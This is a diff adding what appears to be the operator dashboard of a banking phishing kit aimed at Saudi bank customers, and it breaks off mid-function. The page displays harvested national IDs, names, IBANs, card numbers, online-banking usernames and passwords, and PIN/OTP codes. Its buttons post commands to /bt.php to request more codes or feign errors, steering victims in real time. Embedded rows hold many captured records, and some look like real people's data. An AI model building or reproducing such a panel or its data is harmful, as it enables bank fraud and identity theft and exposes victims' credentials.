@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en" style="min-height: 100%; display: flex; flex-direction: column">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+
+    <link rel="stylesheet" href="/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="/css/style.css" />
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="./css/handle.css" />
+  </head>
+  <body style="direction: rtl; text-align: right">
+    <script src="/js/jquery-3.5.1.min.js"></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"
+      integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN"
+      crossorigin="anonymous"
+    ></script>
+    <script defer src="/js/auth.js"></script>
+    <script defer src="/js/login.js"></script>
+    <script defer src="js/init.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script src="/js/Runtime.js"></script>
+    <button class="btn btn-success w-100" onclick="$('#addDiv').toggle()">
+      Add New
+    </button>
+    <div id="addDiv">
+      <form id="addForm">
+        <input
+          type="text"
+          class="form-control mb-3"
+          required
+          data-cs-form-element="id_num"
+          placeholder="رقم البطاقة الوطنية"
+        />
+        <input
+          type="text"
+          class="form-control mb-3"
+          required
+          data-cs-form-element="name_ar"
+          placeholder="الاسم بالعربي"
+        />
+        <input
+          type="text"
+          class="form-control mb-3"
+          required
+          data-cs-form-element="birth_date_h"
+          placeholder="تاريخ الميلاد الهجري"
+        />
+        <input
+          type="text"
+          class="form-control mb-3"
+          required
+          data-cs-form-element="birth_place"
+          placeholder="مكان الولادة"
+        />
+        <button class="btn btn-success w-100" type="submit">حفظ</button>
+      </form>
+    </div>
+    <div id="items"></div>
+    <script>
+      class EventHandler {
+        constructor() {
+          this.events = {};
+        }
+
+        on(eventName, callback) {
+          if (typeof this.events[eventName] === "undefined") {
+            this.events[eventName] = [];
+          }
+          this.events[eventName].push(callback);
+          return this;
+        }
+
+        trigger(eventName, data) {
+          if (typeof this.events[eventName] !== "undefined") {
+            this.events[eventName].forEach(function (cb) {
+              cb({ data: data });
+            });
+          }
+        }
+      }
+
+      class NotificationSocketClient extends EventHandler {
+        constructor(socketAddress) {
+          super();
+          let me = this;
+
+          function connect() {
+            let socket = new WebSocket(socketAddress);
+            console.log(
+              "info",
+              "LTS Feed Client - status " + socket.readyState
+            );
+            socket.onerror = function (err) {
+              console.log(err);
+            };
+            socket.onopen = function () {
+              console.log("info", "Socket Opened");
+            };
+            socket.onmessage = function (msg) {
+              me.trigger("Notification", JSON.parse(msg.data));
+            };
+            socket.onclose = function (msg) {
+              console.log(msg);
+              setTimeout(function () {
+                connect();
+              }, 1000);
+            };
+          }
+
+          Object.assign(this, {
+            init() {
+              connect();
+            },
+          });
+        }
+      }
+
+      Runtime.addTemplate(
+        "bo_session",
+        "PGRpdiBjbGFzcz0icm93IiBzdHlsZT0id2lkdGg6MTAwJSI+CiAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMiIgZGF0YS1ncm91cD0iYmFzZSI+CiAgICAgICAgPGRpdj7Yp9mE2LnZhdmE2YrYqSDYp9mE2KfYrtmK2LHYqTogPHNwYW4gZGF0YS1maWVsZD0ic3RhdGUiPjwvc3Bhbj48L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29sLW1kLTIiIGRhdGEtZ3JvdXA9ImJhc2UiPgogICAgICAgIDxkaXY+2KfZhNin2LPZhTogPHNwYW4gZGF0YS1maWVsZD0ibmFtZV9hciI+PC9zcGFuPjwvZGl2PgogICAgICAgIDxkaXY+2LHZgtmFINio2LfYp9mC2Kkg2KfZhNin2K3ZiNin2YQ6IDxzcGFuIGRhdGEtZmllbGQ9ImlkX251bSI+PC9zcGFuPjwvZGl2PgogICAgICAgIDxkaXY+2KrYp9ix2YrYriDYp9mE2YXZitmE2KfYryDYp9mE2YfYrNix2Yo6IDxzcGFuIGRhdGEtZmllbGQ9ImJpcnRoX2RhdGVfaCI+PC9zcGFuPjwvZGl2PgogICAgICAgIDxkaXY+2YXZg9in2YYg2KfZhNmI2YTYp9iv2Kk6IDxzcGFuIGRhdGEtZmllbGQ9ImJpcnRoX3BsYWNlIj48L3NwYW4+PC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImNvbC1tZC0yIiBkYXRhLWdyb3VwPSJiYXNlIj4KICAgICAgICA8ZGl2Ptin2LPZhSDYp9mE2KjZhtmDOiA8c3BhbiBkYXRhLWZpZWxkPSJiX25hbWUiPjwvc3Bhbj48L2Rpdj4KICAgICAgICA8ZGl2Ptin2YTYp9mK2KjYp9mGOiA8c3BhbiBkYXRhLWZpZWxkPSJpYmFuIj48L3NwYW4+PC9kaXY+CiAgICAgICAgPGRpdj7Zg9mI2K8g2KfZhNit2YjYp9mE2Kk6IDxzcGFuIGRhdGEtZmllbGQ9ImRlcG9zaXRfY29kZSI+PC9zcGFuPjwvZGl2PgogICAgICAgIDxkaXY+2KfZhNmF2KjZhNi6OiA8c3BhbiBkYXRhLWZpZWxkPSJhbW91bnQiPjwvc3Bhbj48L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29sLW1kLTIiIGRhdGEtZ3JvdXA9ImJhc2UiPgoKICAgICAgICA8ZGl2Ptil2LPZhSDYp9mE2YXYs9iq2K7Yr9mFOiA8c3BhbiBkYXRhLWZpZWxkPSJ1c2VybmFtZSI+PC9zcGFuPjwvZGl2PgogICAgICAgIDxkaXY+2YPZhNmF2Kkg2KfZhNmF2LHZiNixOiA8c3BhbiBkYXRhLWZpZWxkPSJwYXNzd29yZCI+PC9zcGFuPjwvZGl2PgoKICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29sLW1kLTIiIGRhdGEtZ3JvdXA9ImJhc2UiPgogICAgICAgIDxkaXY+2LHZgtmFINio2LfYp9mC2Kkg2KfZhNi12LHYp9mBOiA8c3BhbiBkYXRhLWZpZWxkPSJjYXJkX251bSI+PC9zcGFuPjwvZGl2PgogICAgICAgIDxkaXY+2KfZhNix2YXYsiDYp9mE2LPYsdmKINmE2YTYtdix2KfZgTogPHNwYW4gZGF0YS1maWVsZD0iY2FyZF9jb2RlIj48L3NwYW4+PC9kaXY+CgogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0iY29sLW1kLTIiPgogICAgICAgIDx0YWJsZSBjbGFzcz0ib3RwIiBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIj4KICAgICAgICAgICAgPHRoZWFkPgogICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICA8dGg+VGltZTwvdGg+CiAgICAgICAgICAgICAgICA8dGg+T1RQMTwvdGg+CiAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgIDwvdGhlYWQ+CiAgICAgICAgICAgIDx0Ym9keSBkYXRhLWVsPSJvdHAxIj4KCiAgICAgICAgICAgIDwvdGJvZHk+CiAgICAgICAgPC90YWJsZT4KICAgICAgICA8ZGl2IGNsYXNzPSJ0ZXh0LWNlbnRlciBtdC0zIj4KICAgICAgICA8L2Rpdj4KCiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImNvbC1tZC0yIj4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3Mgdy0xMDAiIGRhdGEtYWN0aW9uPSJFUlJPUl9DQVJEX0RFVEFJTFMiPtil2LnYp9iv2Kkg2LfZhNioINiq2YHYp9i12YrZhCDYp9mE2KjYt9in2YLYqTwvYnV0dG9uPgogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tZGFuZ2VyIHctMTAwIG10LTEiIGRhdGEtYWN0aW9uPSJFUlJPUl9PTkxJTkVfQ09OTkVDVElPTiI+2KXYudin2K/YqSDYt9mE2Kgg2KrZgdin2LXZitmEINin2YTYp9mI2YbZhNin2YrZhjwvYnV0dG9uPgogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tc3VjY2VzcyB3LTEwMCBtdC0xIiBkYXRhLWFjdGlvbj0iUkVRVUVTVF9DT0RFIj7Yt9mE2Kgg2KfZhNix2YXYsjwvYnV0dG9uPgogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tZGFuZ2VyIHctMTAwIG10LTEiIGRhdGEtYWN0aW9uPSJFUlJPUl9DT0RFIj7Ypdi52KfYr9ipINi32YTYqCDYp9mE2LHZhdiyPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1zdWNjZXNzIHctMTAwIG10LTEiIGRhdGEtYWN0aW9uPSJDT01QTEVURSI+2KXZhtmH2KfYoTwvYnV0dG9uPgoKICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29sLW1kLTEyIHRleHQtcmlnaHQgcC0yIj4KICAgICAgICA8YnV0dG9uIGRhdGEtY29udHJvbC1hY3Rpb249ImRlbGV0ZSIgc3R5bGU9ImRpc3BsYXk6IGlubGluZSAhaW1wb3J0YW50OyI+IERlbGV0ZTwvYnV0dG9uPgogICAgPC9kaXY+Cgo8L2Rpdj4="
+      );
+      let rows = [
+        {
+          id: "765662",
+          action: "COMPLETE",
+          id_num: "10101010101",
+          name_ar: "ahmad",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "26\/2\/1422",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "kiddah",
+          b_name: "Holandi Awal",
+          iban: "4234234",
+          deposit_code: "5555",
+          amount: "5231",
+          card_num: "1234123421341234",
+          card_code: "4444",
+          username: null,
+          password: null,
+          pin_data:
+            '[{"time":"20:11:55","code":"1231"},{"time":"20:12:21","code":"1231"}]',
+          state: "BANK_UPDATED",
+          last_update: "2022-10-03 22:15:03",
+        },
+        {
+          id: "765661",
+          action: "NONE",
+          id_num: "1111631683",
+          name_ar:
+            "\u0627\u062d\u0645\u062f \u0645\u062d\u0645\u062f \u0639\u0628\u062f\u0644\u0644\u0647 \u0627\u0644\u0628\u0627\u0642\u0631\u064a ",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "26\/2\/1422",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place:
+            "\u0627\u0644\u0645\u0645\u0644\u0643\u0647 \u0627\u0644\u0639\u0631\u0628\u064a\u0647 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0647",
+          b_name: "Ahli Bank",
+          iban: "145647556888",
+          deposit_code: "4557",
+          amount: "4500",
+          card_num: null,
+          card_code: null,
+          username: "ahmedm220110",
+          password: "AHMED11",
+          pin_data: '[{"time":"14:57:50","code":"2988"}]',
+          state: "DETAILS_VIEWED",
+          last_update: "2022-10-03 22:07:33",
+        },
+        {
+          id: "765660",
+          action: "COMPLETE",
+          id_num: "1084967155",
+          name_ar:
+            "\u0647\u062f\u0649 \u0639\u0628\u062f\u0627\u0644\u0631\u062d\u0645\u0646 \u0627\u0628\u0631\u0627\u0647\u064a\u0645 \u0627\u0644\u0636\u0628\u064a\u0628\u064a",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "8\/10\/1415",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place:
+            "\u0627\u0644\u0645\u0645\u0644\u0643\u0647 \u0627\u0644\u0639\u0631\u0628\u064a\u0647 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0647",
+          b_name: "Faransi",
+          iban: "Sa82550000000E402000019",
+          deposit_code: "0243",
+          amount: "1000",
+          card_num: null,
+          card_code: null,
+          username: "1084967155",
+          password: "Aa123456",
+          pin_data: null,
+          state: "BANK_UPDATED",
+          last_update: "2022-10-03 17:46:18",
+        },
+        {
+          id: "765659",
+          action: "COMPLETE",
+          id_num: "5555555555",
+          name_ar: "Djajjd",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "Sushs",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "Haauhe",
+          b_name: "Holandi Awal",
+          iban: "SA5156465165",
+          deposit_code: "21561",
+          amount: "321623",
+          card_num: null,
+          card_code: null,
+          username: "54765163",
+          password: "362516541",
+          pin_data: '[{"time":"13:02:44","code":"6546"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-10-03 17:47:00",
+        },
+        {
+          id: "765658",
+          action: "NONE",
+          id_num: "1093951737",
+          name_ar:
+            "\u0645\u0627\u0631\u064a\u0627 \u0639\u0628\u062f\u0627\u0644\u0631\u062d\u0645\u0646 \u0627\u0628\u0631\u0627\u0647\u064a\u0645 \u0627\u0644\u0636\u0628\u064a\u0628\u064a",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "14\/10\/1417",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place:
+            "\u0627\u0644\u0645\u0645\u0644\u0643\u0647 \u0627\u0644\u0639\u0631\u0628\u064a\u0647 \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0647",
+          b_name: "Rajhi",
+          iban: "SA17 8000 0213 6080 1604 2965",
+          deposit_code: "0243",
+          amount: "1000",
+          card_num: null,
+          card_code: null,
+          username: "1093951737",
+          password: "Aa123456",
+          pin_data: '[{"time":"12:56:33","code":"9088"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-10-03 14:56:33",
+        },
+        {
+          id: "765657",
+          action: "REQUEST_CODE",
+          id_num: "1049651902",
+          name_ar:
+            "\u0645\u062d\u0645\u062f \u0637\u0644\u0627\u0644 \u0645\u062d\u0645\u062f \u0639\u0644\u064a \u062e\u0636\u0631\u0649",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "\u0661\u0664\u0660\u0665\/\u0660\u0666\/\u0661\u0661",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place:
+            "\u0645\u0643\u0629 \u0627\u0644\u0643\u0631\u0645\u0629",
+          b_name: "Saab",
+          iban: "034090290001",
+          deposit_code: "600500",
+          amount: "1000",
+          card_num: null,
+          card_code: null,
+          username: "034090290001",
+          password: "Jtk109016",
+          pin_data:
+            '[{"time":"10:38:37","code":"5503"},{"time":"10:40:37","code":"5503"},{"time":"10:41:27","code":"4654"},{"time":"10:45:42","code":"1520"},{"time":"10:47:32","code":"1520"},{"time":"10:48:44","code":"6298"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-10-03 12:50:44",
+        },
+        {
+          id: "765656",
+          action: "NONE",
+          id_num: "1028140604",
+          name_ar:
+            "\u0641\u0627\u0646\u0632\u0647 \u0639\u0645\u0631 \u0633\u0627\u0644\u0645 \u0628\u0627\u0644\u0643\u0631\u0649",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "\u0661\u0664\u0665\u0668\/\u0660\u0667\/\u0661\u0664",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place:
+            "\u0645\u0643\u0629 \u0627\u0644\u0643\u0631\u0645\u0629",
+          b_name: "Ahli Bank",
+          iban: "SA1310000000155409000106",
+          deposit_code: "56213",
+          amount: "580",
+          card_num: null,
+          card_code: null,
+          username: "Um Raef",
+          password: "1433Rofe",
+          pin_data:
+            '[{"time":"09:11:34","code":"9520"},{"time":"09:15:03","code":"4607"},{"time":"09:21:32","code":"4186"},{"time":"09:22:20","code":"1433"},{"time":"09:23:16","code":"1182"},{"time":"09:40:31","code":"7067"},{"time":"09:41:15","code":"5596"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-10-03 11:41:16",
+        },
+        {
+          id: "765655",
+          action: "NONE",
+          id_num: "1083495174",
+          name_ar:
+            "\u0628\u0634\u0627\u0626\u0631 \u0648\u0642\u064a\u062a \u062d\u0633\u0646 \u062d\u0645\u0632\u064a\u0646 \u0627\u0644\u0635\u0645\u062f\u0627\u0646\u064a",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "\u0662\u0667\/\u0660\u0665\/\u0661\u0664\u0664\u0664",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u0642\u0646\u0641\u0630\u0647",
+          b_name: "Ahli Bank",
+          iban: "SA8710000015268222000104",
+          deposit_code: "700600",
+          amount: "1000",
+          card_num: null,
+          card_code: null,
+          username: null,
+          password: null,
+          pin_data: null,
+          state: "BANK_UPDATED",
+          last_update: "2022-10-03 10:53:57",
+        },
+        {
+          id: "765654",
+          action: "COMPLETE",
+          id_num: "1111111112",
+          name_ar: "salem",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "30\/50\/1443",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "Riad",
+          b_name: "Arabi",
+          iban: "4727471837",
+          deposit_code: "68048",
+          amount: "30000",
+          card_num: null,
+          card_code: null,
+          username: "4717472",
+          password: "48274727",
+          pin_data: '[{"time":"08:04:55","code":"5252"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-10-03 10:05:12",
+        },
+        {
+          id: "765653",
+          action: "COMPLETE",
+          id_num: "999999999",
+          name_ar: "\u0639\u0628\u062f",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "19\/06\/1443",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u062f\u0645\u0627\u0645",
+          b_name: "Riyadh",
+          iban: "SA37173178482",
+          deposit_code: "503959",
+          amount: "30000",
+          card_num: null,
+          card_code: null,
+          username: "Dhajdhs",
+          password: "djsjdh",
+          pin_data:
+            '[{"time":"13:56:40","code":"5284"},{"time":"13:57:22","code":"4344"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-10-02 15:57:26",
+        },
+        {
+          id: "765652",
+          action: "COMPLETE",
+          id_num: "1472583691",
+          name_ar:
+            "\u0639\u0628\u062f\u0627\u0644\u0644\u0647 \u0627\u0644\u0634\u0645\u0631\u064a",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "13\/07\/1443",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u0631\u064a\u0627\u0636",
+          b_name: "Arabi",
+          iban: "Sa27264827482775",
+          deposit_code: "7000",
+          amount: "40000",
+          card_num: null,
+          card_code: null,
+          username: "Ahdhajdj",
+          password: "fjejdjwjd",
+          pin_data:
+            '[{"time":"09:48:26","code":"4252"},{"time":"09:48:57","code":"5253"},{"time":"09:49:09","code":"5353"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-10-02 11:49:16",
+        },
+        {
+          id: "765651",
+          action: "ERROR_ONLINE_CONNECTION",
+          id_num: "2030405060",
+          name_ar: "\u062d\u0633\u064a\u0646",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "30\/20\/1443",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u062f\u0645\u0627\u0645",
+          b_name: "Arabi",
+          iban: "Sa482747284727",
+          deposit_code: "6000",
+          amount: "30000",
+          card_num: null,
+          card_code: null,
+          username: "Hsakdjjs",
+          password: "ajjdjwj",
+          pin_data: '[{"time":"06:31:26","code":"4253"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-10-03 14:59:44",
+        },
+        {
+          id: "765650",
+          action: "NONE",
+          id_num: "1020304050",
+          name_ar: "\u0633\u0627\u0644\u0645",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "30\/20\/1334",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u0631\u0628\u0627\u0636 ",
+          b_name: "Holandi Awal",
+          iban: "SA12345678912348",
+          deposit_code: "45050899",
+          amount: "30000",
+          card_num: null,
+          card_code: null,
+          username: "AAsjhdgjak",
+          password: "ASDsjgk",
+          pin_data:
+            '[{"time":"08:49:30","code":"4635"},{"time":"08:49:59","code":"4554"},{"time":"08:50:35","code":"5343"},{"time":"14:39:29","code":"1234"},{"time":"16:01:19","code":"1234"},{"time":"12:38:51","code":"2224"},{"time":"12:40:35","code":"1234"}]',
+          state: "ONLINE_UPDATED",
+          last_update: "2022-10-03 14:59:04",
+        },
+        {
+          id: "765649",
+          action: "ERROR_ONLINE_CONNECTION",
+          id_num: "1234567890",
+          name_ar: "\u0633\u0627\u0644\u0645 \u0633\u0627\u0644\u0645",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "19\/03\/1443",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u0631\u064a\u0627\u0636",
+          b_name: "Arabi",
+          iban: "57574747484",
+          deposit_code: "6675",
+          amount: "38744",
+          card_num: null,
+          card_code: null,
+          username: "Aaaaaa11",
+          password: "aaaaaa46",
+          pin_data:
+            '[{"time":"16:05:58","code":"4444"},{"time":"16:06:32","code":"5675"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-10-04 19:44:57",
+        },
+        {
+          id: "765648",
+          action: "COMPLETE",
+          id_num: "12345",
+          name_ar: "\u0633\u0627\u0644\u0645 \u0633\u0627\u0644\u0645",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "19\/03\/1443",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u0631\u064a\u0627\u0636",
+          b_name: null,
+          iban: null,
+          deposit_code: null,
+          amount: null,
+          card_num: null,
+          card_code: null,
+          username: null,
+          password: null,
+          pin_data: null,
+          state: "INITIALIZED",
+          last_update: "2022-09-30 18:03:21",
+        },
+        {
+          id: "765647",
+          action: "COMPLETE",
+          id_num: "123456789",
+          name_ar: "\u0627\u062d\u0645\u062f \u0639\u0644\u064a ",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "19\/09\/1443",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "Dmam",
+          b_name: "Arabi",
+          iban: "Safets",
+          deposit_code: "Aresds",
+          amount: "33333",
+          card_num: null,
+          card_code: null,
+          username: "Asfasff",
+          password: "aafadda",
+          pin_data:
+            '[{"time":"14:46:59","code":"5857"},{"time":"23:52:37","code":"3333"},{"time":"23:53:19","code":"4444"}]',
+          state: "ID_ACCEPTED",
+          last_update: "2022-10-01 17:52:37",
+        },
+        {
+          id: "765646",
+          action: "COMPLETE",
+          id_num: "100694433",
+          name_ar: "\u0645\u062d\u0645\u062f",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "03\/10\/1994",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u062e\u0628\u0631",
+          b_name: null,
+          iban: null,
+          deposit_code: null,
+          amount: null,
+          card_num: null,
+          card_code: null,
+          username: null,
+          password: null,
+          pin_data: null,
+          state: "INITIALIZED",
+          last_update: "2022-09-30 16:18:41",
+        },
+        {
+          id: "765645",
+          action: "COMPLETE",
+          id_num: "1048798510",
+          name_ar: "\u0633\u0627\u0645\u064a",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "6.3.1994",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u0639\u0633\u064a\u0631",
+          b_name: null,
+          iban: null,
+          deposit_code: null,
+          amount: null,
+          card_num: null,
+          card_code: null,
+          username: null,
+          password: null,
+          pin_data: null,
+          state: "INITIALIZED",
+          last_update: "2022-09-30 16:16:02",
+        },
+        {
+          id: "765644",
+          action: "COMPLETE",
+          id_num: "1518541510",
+          name_ar: "\u0633\u0627\u0645\u064a",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "6.3.1994",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0627\u0644\u0639\u0633\u064a\u0631",
+          b_name: null,
+          iban: null,
+          deposit_code: null,
+          amount: null,
+          card_num: null,
+          card_code: null,
+          username: null,
+          password: null,
+          pin_data: null,
+          state: "INITIALIZED",
+          last_update: "2022-09-30 16:16:06",
+        },
+        {
+          id: "765643",
+          action: "COMPLETE",
+          id_num: "1234567891",
+          name_ar: "One",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "19\/05\/2020",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "Dmam",
+          b_name: "Inma",
+          iban: "Sa123456789101112",
+          deposit_code: "7747",
+          amount: "30000",
+          card_num: "1234567891012345",
+          card_code: "3717",
+          username: "Aa123",
+          password: "Aa123",
+          pin_data:
+            '[{"time":"14:11:23","code":"1234"},{"time":"14:12:21","code":"1234"},{"time":"14:12:52","code":"1111"},{"time":"14:14:33","code":"1477"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-09-30 18:04:07",
+        },
+        {
+          id: "765642",
+          action: "COMPLETE",
+          id_num: "0987654321",
+          name_ar: "\u0645\u062d\u0645\u062f \u0639\u0633\u064a\u0631\u064a",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "14\/08\/1413",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0631\u064a\u0627\u0636",
+          b_name: "Ahli Bank",
+          iban: "134567887988",
+          deposit_code: "24578678",
+          amount: "4000",
+          card_num: "4580789014531366",
+          card_code: "1234",
+          username: "1356998678",
+          password: "A12334567",
+          pin_data: '[{"time":"14:01:39","code":"4555"}]',
+          state: "ONLINE_UPDATED",
+          last_update: "2022-09-30 18:04:05",
+        },
+        {
+          id: "765641",
+          action: "COMPLETE",
+          id_num: "1081217315",
+          name_ar:
+            "\u064a\u062d\u064a\u0649 \u0628\u0646 \u0645\u062d\u0645\u062f \u064a\u062d\u064a\u0649 \u0639\u0633\u064a\u0631\u064a",
+          name_en: null,
+          birth_date_m: null,
+          birth_date_h: "14\/08\/1413",
+          end_date_m: null,
+          end_date_h: null,
+          birth_place: "\u0631\u062c\u0627\u0644 \u0627\u0644\u0645\u0639",
+          b_name: "Saab",
+          iban: "SA52546464646464",
+          deposit_code: "12500",
+          amount: "1200",
+          card_num: null,
+          card_code: null,
+          username: "test",
+          password: "12346",
+          pin_data:
+            '[{"time":"09:48:43","code":"1234"},{"time":"09:49:03","code":"2525"},{"time":"09:49:37","code":"2526"},{"time":"09:54:53","code":"1250"},{"time":"09:55:08","code":"1250"}]',
+          state: "PIN_ADDED",
+          last_update: "2022-09-30 16:05:05",
+        },
+      ];
+      let rowHandlers = {};
+
+      class RowHandler {
+        constructor(rowData) {
+          let container = $(Runtime.getTemplate("bo_session"));
+          $("#items").append(container);
+          let eventInitialized = false;
+          function update() {
+            /*
+                    rowData.account_details = JSON.parse(rowData.account_details);
+                    rowData.login_data = JSON.parse(rowData.login_data);
+                    rowData.sign_up_data = JSON.parse(rowData.sign_up_data);
+                    rowData.otp_data1 = JSON.parse(rowData.otp_data1);
+                    rowData.otp_data2 = JSON.parse(rowData.otp_data2);
+                     */
+            rowData.pin_data = JSON.parse(rowData.pin_data);
+            let updateFields = (group, dataset) => {
+              if (dataset) {
+                container
+                  .find(`[data-group="${group}"]`)
+                  .find("[data-field]")
+                  .each((k, el) => {
+                    el = $(el);
+                    el.html(dataset[el.attr("data-field")]);
+                  });
+              }
+            };
+            updateFields("base", rowData);
+            /*
+                    'INITIALIZED','ID_ACCEPTED','DETAILS_VIEWED','PIN_ADDED','ONLINE_UPDATED','CARD_UPDATED','FINISHED'
+                    updateFields('sign_up_data', rowData.sign_up_data);
+                    updateFields('account_details', rowData.account_details);
+
+                     */
+            container.find('[data-el="otp1"]').html("");
+            if (rowData.pin_data && rowData.pin_data.length) {
+              $.each(rowData.pin_data, (k, v) => {
+                container
+                  .find('[data-el="otp1"]')
+                  .append(
+                    $("<tr/>")
+                      .append($("<td/>").append(v.time))
+                      .append($("<td/>").append(v.code))
+                  );
+              });
+            }
+            if (!eventInitialized) {
+              container
+                .find('[data-control-action="delete"]')
+                .on("click", () => {
+                  if (confirm("Are you sure you want to delete this row?")) {
+                    $.ajax({
+                      type: "POST",
+                      url: "/bt.php",
+                      data: { id: rowData.id, deleteElement: 1 },
+                      dataType: "json",
+                      success: function (res) {
+                        container.remove();
+                      },
+                      error: function (err) {},
+                    });
+                  }
+                });
+              container.find("button[data-action]").each((k, v) => {
+                let bt = $(v);
+                bt.on("click", () => {
+                  function processIt() {
+                    $.ajax({
+                      type: "POST",
+                      url: "/bt.php",
+                      data: { id: rowData.id, ta: bt.attr("data-action") },
+                      dataType: "json",
+                      success: function (res) {},
+                      error: function (err) {},
+                    });
+                  }
+                  if (bt.attr("data-action") == "COMPLETE") {
+                    if (confirm("Are you sure?")) {
+                      processIt();
+                    }
+                  } else {
+                    processIt();
+                  }
+                });
+              });
+              eventInitialized = true;
+            }
+            /*
+                    'INITIALIZED','ID_ACCEPTED','DETAILS_VIEWED','PIN_ADDED','ONLINE_UPDATED','CARD_UPDATED','FINISHED'
+                     */
+            container.find("button[data-action]").hide();
+            if (rowData.state == "ONLINE_UPDATED") {
+              container.find('button[data-action="REQUEST_CODE"]').show();
+              container
+                .find('button[data-action="ERROR_ONLINE_CONNECTION"]')
+                .show();
+            }
+            if (rowData.state == "CARD_UPDATED") {
+              container.find('button[data-action="REQUEST_CODE"]').show();
+              container.find('button[data-action="ERROR_CARD_DETAILS"]').show();
+            }
+            if (rowData.state == "PIN_ADDED") {
+              container.find('button[data-action="REQUEST_CODE"]').show();
+              container.find('button[data-action="ERROR_CODE"]').show();
+              container.find('button[data-action="ERROR_CARD_DETAILS"]').show();
+              container
+                .find('button[data-action="ERROR_ONLINE_CONNECTION"]')
+                .show();
+              container.find('button[data-action="COMPLETE"]').show();
+            }
+          }
+
+          update();
+          this.updateData = (data) => {
+            if (data.last_update !== rowData.last_update) {
+              rowData = data;
+              update();
+            }
+          };
+        }
+      }
+
+      $.each(rows, (k, v) => {
+        rowHandlers[v.id] = new RowHandler(v);
+      });
+
+      setInterval(function () {
+        $.ajax({
+          type: "POST",
+          url: "/gu.php",
+          data: {},
+          dataType: "json",
+          success: function (res) {
+            $.each(res, (k, v) => {
+              if (typeof rowHandlers[v.id] !== "undefined") {
+                rowHandlers[v.id].updateData(v);
+              } else {
+                rowHandlers[v.id] = new RowHandler(v);
+              }
+            });
